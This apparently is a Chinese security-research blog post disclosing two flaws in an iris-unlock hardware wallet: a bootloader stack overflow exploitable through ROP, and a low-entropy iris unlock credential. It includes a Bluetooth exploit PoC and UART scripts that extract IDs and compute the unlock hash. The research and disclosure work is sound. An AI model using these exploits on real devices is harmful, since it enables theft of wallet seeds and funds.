---
layout: post
title: "从 Bootloader 到虹膜识别：一款硬件钱包的安全拆解"
lang: cn
category: cn
post_id: iris-wallet-security-2025
---

最近，我入手了一款以虹膜认证为卖点的硬件钱包，虹膜这个组件感觉很新奇，就仔细分析了一下它的实现。由于钱包的软硬件设计在很多方面都借鉴了OneKey Touch，而 OneKey 本身又是知名硬件钱包 Trezor 的一个 Fork，因而分析的时候大部分逻辑是有源码可以参考的。

### 硬件架构概览

拆开钱包后，其内部硬件布局如下：

![核心芯片及硬件布局]({{ "/assets/images/iris-wallet/1.jpg" | relative_url }})

它主要由三个主要部分构成：

**主控单元 (MCU)** 采用 `STM32H7` 作为主控 MCU，负责与用户交互，如控制屏幕显示、处理按键输入等基础硬件操作。
**安全芯片 (Secure Element, SE)** 使用了紫光同芯的 `THD89`。负责锁屏密码验证、密钥的加密存储与管理等关键任务。
**虹膜识别模块 （IRIS）** 是该钱包最大的亮点，由一颗独立的 Rockchip `RV1106` 芯片驱动，构成了一个相对独立的子系统。

Rockchip 这个芯片还是挺让我陷入回忆的，感觉应该是十几年前了，那会儿刚出了一种叫“电视棒”的设备，把它插在电视的 HDMI 接口上，就能让传统电视上蹦一个安卓系统出来，算是今天很多电视盒子的鼻祖了。当时的电视棒可以刷Android或者Linux，在喜欢折腾的极客圈子里颇受欢迎。时日，Rockchip 在音视频处理领域早就驾轻就熟了，甚至还有搭载了支持AI的NPU，所以人脸/虹膜识别这种任务是可以轻松胜任的。它这里用的虹膜识别模块本身是一块独立的小 PCB 板，搭载了 Rockchip 芯片、独立的存储，并运行着一个经过裁剪的 Android。

**模块间的连接方式：**

  * **MCU 与外部:** 主要通过**蓝牙**进行通信。虽然设备上有 USB 接口，但其数据传输功能已被禁用。
  * **MCU 与安全芯片:** 通过若干 GPIO 引脚连接，采用私有协议进行通信。
  * **MCU 与虹膜识别模块:** 同样通过 GPIO 连接，使用的是标准的 **UART协议**。

在对这款钱包的分析中，我发现了两个严重的安全漏洞。

  * **Bootloader的栈溢出**，神奇是确实可以利用它执行任意代码，接管启动链。
  * **虹膜识别的逻辑缺陷**，允许攻击者绕过虹膜验证，直接计算解锁凭据。

接下来，我们将逐一分析这两个有趣的问题。

-----

### Bootloader的栈溢出

Bootloader 有两种工作模式：普通用户模式 (`bootloader_usb_loop`) 和工厂模式 (`bootloader_usb_loop_factory`)。通过逆向分析 Bootloader 代码，能看出来它基本与 OneKey Touch 的同源。其中与安全芯片（SE）进行证书写入等初始化的接口，**仅在工厂模式下暴露**，所以 OneKey 的逻辑是：

```c
// 普通用户模式的消息循环，不包含 WriteSEPublicCert
secbool bootloader_usb_loop(...) {
  switch (msg_id) {
    // ...
    // 不包含与SE证书写入相关的消息处理
    // ...
  }
}

// 工厂模式的消息循环，包含 WriteSEPublicCert
secbool bootloader_usb_loop_factory(...) {
  switch (msg_id) {
    // ...
    case MSG_NAME_TO_ID(WriteSEPublicCert):
      process_msg_WriteSEPublicCert(USB_IFACE_NUM, msg_size, buf);
      break;
    // ...
  }
}
```

然而这款钱包中，`process_msg_WriteSEPublicCert` 这个本应属于工厂模式的敏感操作，却被放置在了**普通用户的 Bootloader 主循环**里。

```c
int __fastcall bootloader_usb_loop(int vhdr, int hdr) 
{
  // ...
  switch ( msg_id )
  {
    case 10004u: process_msg_ReadSEPublicKey(0, msg_size, (int)buf); break;
    case 10006u: process_msg_WriteSEPublicCert(0, msg_size, (int)buf); break;
    case 10007u: process_msg_ReadSEPublicCert(0, msg_size, (int)buf); break;
    case 10012u: process_msg_SESignMessage(0, msg_size, (int)buf); break;
    default: goto LABEL_17;
  }
  // ...
}
```

这个并不是说量产的钱包拿在手里就可以再调用这个接口随意修改SE的证书了，因为SE固件那边还是自己做了状态验证的。不过到这儿，能感觉出来厂商还是有些魔改的，所以我就接着往下看这几个改动的后续。
Bootloader 里的消息响应函数参数都是通过 Protobuf 格式定义的。对比 OneKey 源码和目标钱包的反编译代码，明显 `process_msg_WriteSEPublicCert` 的参数大小变了。

**OneKey**：

```c
void process_msg_WriteSEPublicCert(uint8_t iface_num, uint32_t msg_size, uint8_t *buf) {
  MSG_RECV_INIT(WriteSEPublicCert);
  MSG_RECV(WriteSEPublicCert);

  if (se_write_certificate(msg_recv.public_cert.bytes,
                            msg_recv.public_cert.size)) {
    send_success(iface_num, "Write certificate success");
  } else {
    send_failure(iface_num, FailureType_Failure_ProcessError,
                  "Write certificate Failed");
  }
}
```

**目标钱包**在栈上为 `msg_recv` 分配了更大的空间：

```c
int __fastcall process_msg_WriteSEPublicCert(int iface_num, int msg_size, int buf)
{
  int result; // r0
  WriteSEPublicCert msg_recv; // [sp+8h] [bp-820h] BYREF
  // ...
  recv_msg(iface_num, msg_size, buf, &off_805D1DC, &msg_recv);
  if ( se_write_certificate(msg_recv.public_cert_bytes, (unsigned __int16)msg_recv.public_cert_size) )
    result = send_failure(iface_num, 9, "Write certificate Failed");
  else
    result = send_success(iface_num, "Write certificate success");
  // ...
  return result;
}
```

据此可以推断参数`WriteSEPublicCert_public_cert_t`从 `PB_BYTES_ARRAY_T(416)` 变成了 `PB_BYTES_ARRAY_T(2048)`，问题出在底层的驱动没有同步这个变化。

**OneKey使用的安全芯片驱动：**
```c
bool se_write_certificate(const uint8_t *cert, uint32_t cert_len) {
  // 委托给底层驱动分块写入，不存在大缓冲区栈拷贝
  return atca_write_certificate(cert, cert_len);
}
```

**目标钱包驱动实现：**

```c
BOOL __fastcall se_write_certificate(char *cert, int cert_len)
{
    // ...
    _BYTE command[1024];
    int cookie;
    // ...
    memcpy_reg((int)&command[3], cert, cert_len); // cert_len 最大可为 2048
    response_set_length(command, cert_len);
    cmd_size = command_size(command);
    v5 = thd89_execute_command(command, cmd_size, response, 16, &response_size);
    // ...
}
```

由于目标钱包的驱动仅是用了一个 **1024 字节**的缓冲区，然后 `memcpy_reg` 将最大可能为 **2048 字节**的数据拷贝进去，栈溢出漏洞由此产生。一般来说栈溢出早就绝迹了，Stack Cookie 机制可以很容易防御利用此类漏洞控PC。但骚的来了，我发现该固件代码中 Cookie 只有LDR，没有STR，就是说没人给他初始化过。对比 `reset_handler`，能发现 Cookie 初始化的部分竟然被删了：

OneKey：
```armasm
reset_handler:
  ; ...

  ; copy data in from flash
  ldr r0, =data_vma     ; dst addr
  ldr r1, =data_lma     // src addr
  ldr r2, =data_size    // size in bytes
  bl memcpy

  ; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
  ; setup the stack protector with an unpredictable value
  bl rng_get
  ldr r1, = __stack_chk_guard
  str r0, [r1]
  ; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

  ; re-enable exceptions
  cpsie f

  ; enter the application code
  bl main

  b shutdown_privileged
```

目标钱包：
```armasm
; 目标钱包固件的 reset_handler (存在缺陷的实现)
08028E30     LDR      R0, =unk_20000000
08028E32     LDR      R1, =unk_805E400
08028E34     LDR      R2, =0x200
08028E36     BL       memcpy_reg
; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
;
;     此处缺失了对 Stack Cookie 的初始化代码
;
; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
08028E3A     CPSIE    F
08028E3C     BL       main
08028E40     B.W      shutdown_priviledged
```

在内存拷贝 (`memcpy_reg`) 和开中断 (`CPSIE F`) 之间，本来应该有初始化 Stack Cookie 的那几行，现在整段逻辑都不见了，Cookie 就一直卡在 0，栈保护名存实亡。我猜他们在调试时喂了一个正好 1024 字节的证书，却忘了 command[1024] 前面 3 个字节要写命令和长度，结果自然是溢出改了 Cookie 然后就崩了。纠错的人根据错误把 Cookie 初始化那几行注释掉，发现能跑通（大概是因为证书结尾刚好写了三个 0），于是留下了这个坑。

尽管是嵌入式的执行环境，但STM32还是有内存保护的，依靠的是硬件的MPU，bootloader早起代码会给内存分段，配置读写执行等属性：

```c
int __fastcall mpu_config_bootloader(int a1, int a2, int a3)
{
  int result; // r0
  MPU_Region_InitTypeDef MPU_InitStruct; // [sp+4h] [bp-24h] BYREF
  int v5; // [sp+14h] [bp-14h]

  v5 = stack_cookie;
  HAL_MPU_Disable();
  *(_WORD *)&MPU_InitStruct.Enable = 0x101;
  *(_DWORD *)&MPU_InitStruct.DisableExec = 0x1010001;
  MPU_InitStruct.BaseAddress = 0x20000000;
  *(_DWORD *)&MPU_InitStruct.Size = 0x301001C;
  HAL_MPU_ConfigRegion(&MPU_InitStruct);
  *(_WORD *)&MPU_InitStruct.Enable = 0x201;
  //...
  HAL_MPU_ConfigRegion(&MPU_InitStruct);
  result = HAL_MPU_Enable(4);
  if ( stack_cookie != v5 )
    stack_corrupt();
  return result;
}
```

但这么一个没有随机化的环境简直就是ROP的温床，我们可以直接利用它自带的完美 Gadget：`HAL_MPU_Disable` 先关掉MPU保护，然后就能跳栈上执行shellcode：

```armasm
; HAL_MPU_Disable 函数反汇编
0802E7CC HAL_MPU_Disable
0802E7CC     PUSH    {R0-R2,LR}
             ; ...
0802E7D4     MOV.W   R3, #0
             ; ... 函数体，执行禁用MPU的操作 ...
0802E7FE     ADD     SP, SP, #0xC
0802E800     POP.W   {PC} ;
```

```python
# POC片段
async def main():
    # ... (设备发现和连接代码) ...
    async with TouchBLE(device.address) as touch:
        await touch.send(messages.Initialize())

        shellcode_addr = 0x2001XXXX
        gadget_addr = 0x0802E7D4 + 1 # Thumb 模式

        payload = b"A" * (1024 - 3)
        # stack_cookie
        payload += struct.pack("<I", 0)
        # Padding 和 R4-R7
        payload += b"B" * 20
        # LR
        payload += struct.pack("<I", gadget_addr)
        # ADD SP, SP, #0xC
        payload += b"C" * 12
        # POP {PC}
        payload += struct.pack("<I", shellcode_addr)
        shellcode = b"\xDE\xAD\xBE\xEF..."

        final_payload = bytearray(payload)
        final_payload[0:len(shellcode)] = shellcode 

        msg = WriteSEPublicCert(public_cert=bytes(final_payload))
        msg_type, response_payload = await touch.send(msg)

```

<details markdown="block">
<summary>完整的通过蓝牙触发的 PoC</summary>

```python
import asyncio
import struct
from bleak import BleakClient, BleakScanner
from trezorlib import messages, protobuf
from io import BytesIO

SERVICE_UUID = "00000001-0000-1000-8000-00805f9b34fb"
WRITE_UUID   = "00000002-0000-1000-8000-00805f9b34fb"
NOTIFY_UUID  = "00000003-0000-1000-8000-00805f9b34fb"

FRAME_HEAD   = b"\x23\x23"  # '##'
FRAME_PREFIX = 0x3F         # '?'
CHUNK_SIZE   = 63

class TouchBLE:
    def __init__(self, address):
        self.address = address
        self.client = BleakClient(address)
        self.queue = asyncio.Queue()
        self.buffer = bytearray()
        self.expected_len = None

    async def __aenter__(self):
        await self.client.connect()
        await self.client.start_notify(NOTIFY_UUID, self._notify_handler)
        return self

    async def __aexit__(self, exc_type, exc, tb):
        await self.client.disconnect()

    def _notify_handler(self, _, data: bytearray):
        if not data:
            return

        if data[0] != FRAME_PREFIX:
            self.buffer.extend(data)
        else:
            chunk = data[1:]
            if chunk.startswith(FRAME_HEAD):
                self.buffer = bytearray(chunk)
                if len(self.buffer) >= 8:
                    self.expected_len = struct.unpack(">I", self.buffer[4:8])[0]
            else:
                 self.buffer.extend(chunk)

        if self.expected_len is not None and len(self.buffer) - 8 >= self.expected_len:
            msg_type = struct.unpack(">H", self.buffer[2:4])[0]
            payload = bytes(self.buffer[8 : 8 + self.expected_len])
            self.queue.put_nowait((msg_type, payload))
            self.buffer.clear()
            self.expected_len = None

    async def send(self, msg):
        buf = BytesIO()
        protobuf.dump_message(buf, msg)
        payload = buf.getvalue()
        
        msg_type = msg.MESSAGE_WIRE_TYPE
        header = struct.pack(">2sHI", FRAME_HEAD, msg_type, len(payload))
        frame = header + payload
        
        for i in range(0, len(frame), CHUNK_SIZE):
            chunk = frame[i : i + CHUNK_SIZE]
            await self.client.write_gatt_char(WRITE_UUID, bytes([FRAME_PREFIX]) + chunk, response=False)
            await asyncio.sleep(0.02)
        return await self.queue.get()

class WriteSEPublicCert(protobuf.MessageType):
    MESSAGE_WIRE_TYPE = 10006
    FIELDS = {1: protobuf.Field("public_cert", "bytes")}
    def __init__(self, *, public_cert) -> None:
        self.public_cert = public_cert

async def main():
    device = await BleakScanner.find_device_by_filter(
        lambda d, ad: SERVICE_UUID in ad.service_uuids
    )
    if not device:
        return

    async with TouchBLE(device.address) as touch:
        await touch.send(messages.Initialize())

        shellcode_addr = 0x2001XXX0  # Shellcode 位于可控缓冲区内，需精确计算
        gadget_addr = 0x0802E7D4 + 1 # Gadget 地址 (Thumb 模式)

        payload = b"A" * (1024 - 3)
        # stack_cookie
        payload += struct.pack("<I", 0)
        # Padding 和 R4-R7
        payload += b"B" * 20
        # LR
        payload += struct.pack("<I", gadget_addr)
        # ADD SP, SP, #0xC
        payload += b"C" * 12
        # POP {PC}
        payload += struct.pack("<I", shellcode_addr)
        shellcode = b"\xDE\xAD\xBE\xEF..."

        final_payload = bytearray(payload)
        final_payload[0:len(shellcode)] = shellcode 

        msg = WriteSEPublicCert(public_cert=bytes(final_payload))
        msg_type, response_payload = await touch.send(msg)

if __name__ == "__main__":
    asyncio.run(main())
```

</details>

-----

### 虹膜识别的逻辑缺陷

在手机上，锁屏密码是最关键的凭据，一般交由 `gatekeeper` 验证，算出token后再给 `keymaster` 才能解密磁盘。生物识别仅仅是辅助，用于在磁盘已经解密后，验证一个临时凭据实现快速解开锁屏。但在这款硬件钱包里，虹膜识别和锁屏密码地位相同，可以独立使用，其逻辑大致如下：
```python
async def verify_protection(...) -> None: 
    # ...
    while True:
        protection = bytearray()
        # ...
        if protect_type & DEVICE_PROTECT_TYPE_IRIS:
            iris_data = await request_iris_match(ctx)

        if protect_type & DEVICE_PROTECT_TYPE_PIN:
            pin = await request_pin(ctx, i18n.Title.enter_pin)

        if protect_type & DEVICE_PROTECT_TYPE_PIN:
            protection.extend(pin.encode())
        if protect_type & DEVICE_PROTECT_TYPE_IRIS:
            protection.extend(iris_data)

        if config.unlock(protection, salt):
        # ...
```

虹膜识别成功后，会向 MCU 发送一个32字节的“密码”用于解锁，和锁屏密码的作用完全相同。因而单靠虹膜解锁是最优解，不仅比输入 PIN 码更方便，复杂度表面看也更高。然而，事实并非如此。

要分析虹膜模块，我们首先需要解开它的固件。Rockchip 平台的固件解包历史上有过几套工具，试过可用且仍在更新的有：

  * `apftool-rs` ([https://github.com/suyulin/apftool-rs](https://github.com/suyulin/apftool-rs)) 可以解开最外层的固件包。
  * `u-boot-tools` 工具集中的 `dumpimage` 可以解开 `boot.img`。
  * `rsce-go` ([https://github.com/Evsio0n/rsce-go](https://github.com/Evsio0n/rsce-go)) 可以解开一些资源配置文件。

解包后，发现 Rockchip 这边这是颇有洞天啊，基本是一个完整带TEE的Android环境，和MCU通过UART通信。其核心服务是用户态进程 `iris_face_service` 实现的，接管处理UART发来的消息：
```c
int SnProcessor_V2::process(SnProcessor_V2 *this, SnProtocol_V2 *m_inProtocol, ...)
{
  switch ( msg_id - 1 )
  {
    case 0u: // MSG_ID_REGIST (0x01)
      SnProcessor_V2::process_regist(this, ...); break;
    case 3u: // MSG_ID_MATCH (0x04)
      SnProcessor_V2::process_match(this, ...); break;
    case 5u: // MSG_ID_USER_GET_ALL (0x06)
      SnProcessor_V2::process_user_get_all(this); break;
    case 11u: // MSG_ID_DEVICE_GET_SERIAL_CODE (0x0C)
      SnProcessor_V2::process_get_serial_code(this); break;
    // ... (还有大量其他 case)
  }
}
```

如果从钱包固件看，虹膜组件只有注册、匹配和清除数据三个接口。但从虹膜这边看，它支持远十几条命令，还包括 USER_GET_ALL 和 DEVICE_GET_SERIAL_CODE 等接口。
正常情况下，`MATCH` 和 `REGIST` 两个流程执行成功时，程序都会调用相同的 UserResponseMessage::write_virtual 函数来构造返回给 MCU 的响应包。这个函数包含了32字节哈希的产生过程：

```c
bool UserResponseMessage::write_virtual(status *a1, SnProtocol_V2 *a2)
{
  unsigned __int8 hash[48];
  // 调用 usr_id_hash32 函数，使用 uid 生成一个哈希值
  usr_id_hash32((unsigned __int16)a1->uid, hash);
  // 将 32 字节的哈希值写入响应包
  return a2->vptr->write_buf(a2, hash, 32) == 32;
}

int usr_id_hash32(unsigned int ID, unsigned __int8 *output)
{
  char seed[4];
  char label[32];
  *(_DWORD *)seed = ID;
  strcpy(label, "IrisUserIdLabel");
  device_id = DeviceInfo::get_device_id(instance);
  return tls_prf_sha256(device_id, 0x10u, label, 0x10u, seed, 4u, output, 0x20u);
}
```

这意味着，返回的哈希值与用户的虹膜生物特征没有任何关系，它完全由 `DeviceID` 和 `UserID` 决定。
`UserID` 在注册时由 ModuleServiceDefault::regist 函数生成，`UserID` 是一个随机生成的 2 字节整数，且其值被限制在 1000 到 65535 之间：

```c
int ModuleServiceDefault::regist(..., int id, ...)
{
  if ( id <= 0 ) // 这是MCU调用的分支
  {
    do {
      rk_get_random(&_uid_random, 2u);
      uid = _uid_random;
      if ( uid < 1000 )
        LOWORD(uid) = uid + 1000;
      _uid_random = (unsigned __int16)uid;
    } while ( !database->vptr->get_user_status(database) ); // 检查ID是否已存在
  }
}
```
所以尽管返回的被当作密码的哈希有32个字节，但其真实信息熵远小于**6位数字**。更糟糕的是，我们可以通过UART直接向虹膜模块发送 `MSG_ID_USER_GET_ALL` 和 `MSG_ID_DEVICE_GET_SERIAL_CODE` 请求所有用户的 `UserID` 和设备的 `DeviceID`。所以我们的攻击路径变得异常简单。首先将硬件钱包拆开，把虹膜识别模块的小板物理分离。如下图所示，通过一个 FPC 转接板将模块的 UART 连接到一个 FT232 USB 串口转换器上，从而在 PC 上直接与模块通信。

![通过 UART 串口与虹膜模块通信]({{ "/assets/images/iris-wallet/2.jpg" | relative_url }})

然后运行以下 Python 脚本，通过 UART 获取所有 `UserID` 和 `DeviceID`。

```python
import serial
import time
import binascii
import struct
from typing import Optional

SERIAL_PORT = '/dev/ttyUSB0'
BAUDRATE = 115200

PACKET_HEADER = b'\xfe\xfd'
MSG_TYPE_REQUEST = 0x00
MSG_ID_USER_GET_ID_ALL = 0x06
MSG_ID_DEVICE_GET_SERIAL_CODE = 0x0C

def calculate_xor_crc(data: bytes) -> int:
    crc = 0
    for byte in data:
        crc ^= byte
    return crc

def build_request_packet(msg_id: int, payload: bytes = b"") -> bytes:
    msg_id_byte = msg_id.to_bytes(1, 'little')
    msg_type_byte = MSG_TYPE_REQUEST.to_bytes(1, 'little')
    payload_len_bytes = len(payload).to_bytes(2, 'little')
    
    message_body = msg_id_byte + msg_type_byte + payload_len_bytes + payload
    crc_byte = calculate_xor_crc(message_body).to_bytes(1, 'little')
    
    return PACKET_HEADER + message_body + crc_byte

if __name__ == "__main__":
    ser = serial.Serial(SERIAL_PORT, BAUDRATE, timeout=10)
    serial_packet = build_request_packet(MSG_ID_DEVICE_GET_SERIAL_CODE)
    ser.write(serial_packet)
    time.sleep(1)
    
    response_serial = ser.read(128)
    device_id = response_serial[7:-1]
    print(f"[+] Device ID: {binascii.hexlify(device_id).decode()}")

    uid_packet = build_request_packet(MSG_ID_USER_GET_ID_ALL)
    ser.write(uid_packet)
    time.sleep(1)
    
    response_uid = ser.read(128)
    user_id_bytes = response_uid[9:11]
    user_id = struct.unpack("<H", user_id_bytes)[0]
    print(f"[+] User ID: 0x{user_id:04x}")
```

之后就可以使用以下脚本计算出真正的“解锁密码”了：

```python
import hmac
import hashlib
import binascii
import struct

def p_sha256(secret, seed, length):
    output = b''
    a = hmac.new(secret, seed, hashlib.sha256).digest()
    while len(output) < length:
        output += hmac.new(secret, a + seed, hashlib.sha256).digest()
        a = hmac.new(secret, a, hashlib.sha256).digest()
    return output[:length]

def tls_prf_sha256(secret, label, seed, length):
    combined_seed = label + seed
    return p_sha256(secret, combined_seed, length)

serialnum = b'...' # 从上一步获取
uid = 0x...       # 从上一步获取

device_id = binascii.unhexlify(serialnum)[:16]
seed_id = struct.pack('<I', uid)
label_bytes = b"IrisUserIdLabel\x00"

final_hash = tls_prf_sha256(device_id, label_bytes, seed_id, 32)
print(final_hash.hex())
```

最后我们将PC通过 UART 连接到钱包主板，在虹膜验证时发送计算出的 `final_hash`，即可成功彻底解锁。如果结合两个漏洞，我们可以不拆机，利用bootloader代码执行直接给虹膜组件发送消息取得凭证，然后和安全芯片通信拿到key，解锁加密存储获得钱包助记词。

-----

### 总结

当一个复杂产品由多个团队（比如钱包开发商 vs 驱动/模块提供方）协作开发时，极易出现信息不对称和集成错误：主控 MCU 的开发者可能只知道“调用虹膜模块会返回一个 32 字节的密码”，并理所当然地认为这是一个高安全的生物特征值，而不知道其生成熵极低且可被轻易获取；虹膜模块的开发者可能也只是被要求“识别成功后返回一个哈希”，而不知道这个哈希值被用作了**最高权限的解锁凭证**，如果他们认为这只是多因子认证中的一个环节，那么设计出这样一个低熵的方案似乎也可以“理解”；从钱包固件来看，虹膜模块只暴露了注册、匹配、删除等几个有限的接口，但虹膜模块本身却开放了获取所有用户ID、序列号等大量接口，钱包的开发人员对此可能完全不知情；再比如 Bootloader 只知道传一个证书给安全芯片驱动，但不知道安全驱动的缓冲区和上层 Protobuf 的不匹配问题。

安全芯片或者独立的生物识别模块都不是银弹，协同一体化的设计才是。最终，这些看似孤立的疏忽串联在一起，导致了整个钱包安全体系的崩溃。对于硬件钱包这类对安全要求极高的设备而言，任何一个环节的短板，都可能成为千里之堤上的蚁穴。